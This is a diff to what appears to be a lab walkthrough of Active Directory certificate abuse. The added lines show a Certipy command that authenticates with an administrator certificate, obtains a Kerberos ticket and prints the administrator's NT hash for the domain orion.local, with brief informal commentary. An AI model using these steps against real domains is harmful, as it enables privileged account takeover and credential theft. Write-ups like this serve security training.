@@ -740,5 +740,24 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Ill then request an administrator cert
 
 ```python
+❯❯❯ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.0.0.5'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@orion.local'
+[*]     SAN URL SID: 'S-1-5-21-285037524-3800758587-3641439792-500'
+[*]     Security Extension SID: 'S-1-5-21-285037524-3800758587-3641439792-500'
+[*] Using principal: 'administrator@orion.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@orion.local': aad3b435b51404eeaad3b435b51404ee:54c9fa5ad8849c9414602fe021314d49
+```
+
+Then ill auth and get a TGT and get a hash
+
+```python
 
 ```
